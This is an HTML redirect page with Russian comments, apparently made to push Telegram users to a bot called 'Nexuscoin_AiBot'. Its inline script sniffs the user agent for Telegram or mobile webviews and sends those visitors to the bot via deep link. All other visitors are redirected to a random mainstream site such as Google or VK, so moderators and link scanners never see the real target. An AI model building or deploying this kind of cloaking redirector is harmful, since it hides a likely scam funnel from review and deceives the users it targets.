<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Loading...</title>
  
  <script>
    (function() {
      const ua = navigator.userAgent || '';
      const vendor = navigator.vendor || '';
      const platform = navigator.platform || '';
      
      // 🔥 МНОЖЕСТВЕННЫЕ ПРОВЕРКИ TELEGRAM
      const checks = {
        'ua_telegram': /Telegram/i.test(ua),
        'ua_bot': /TelegramBot/i.test(ua),
        'vendor_telegram': /Telegram/i.test(vendor),
        'android_wv': /Android.*wv/i.test(ua),
        'iphone_webview': /iPhone.*Safari/i.test(ua) && !/Chrome/i.test(ua),
        'platform': platform
      };
      
      // Считаем Telegram если хотя бы одна проверка true
      const isTelegram = Object.values(checks).some(v => v === true);
      
      const telegramLink = 'https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe';
      const telegramDeepLink = 'tg://resolve?domain=Nexuscoin_AiBot&start=fgdgfd2fe';
      
      const sites = [
        'https://www.google.com',
        'https://www.youtube.com',
        'https://vk.com',
        'https://dzen.ru'
      ];
      
      if (isTelegram) {
        // 🎯 TELEGRAM DETECTED!
        // Сначала пробуем глубокую ссылку (откроет приложение)
        window.location = telegramDeepLink;
        
        // Через 1 секунду пробуем https (если deep link не сработал)
        setTimeout(() => {
          window.location.href = telegramLink;
        }, 1000);
        
      } else {
        // 🌐 ОБЫЧНЫЙ БРАУЗЕР
        const randomIndex = Math.floor(Math.random() * sites.length);
        window.location.replace(sites[randomIndex]);
      }
    })();
  </script>
</head>
<body>
  <p style="font-family: sans-serif; text-align: center; margin-top: 20vh;">
    Loading...
  </p>
  
  <!-- Запасная кнопка -->
  <div style="text-align: center; margin-top: 30px;">
    <a href="https://t.me/Nexuscoin_AiBot?start=fgdgfd2fe" 
       style="background: #0088cc; color: white; padding: 15px 30px; text-decoration: none; border-radius: 5px; font-weight: bold;">
      Открыть бота Telegram
    </a>
  </div>
</body>
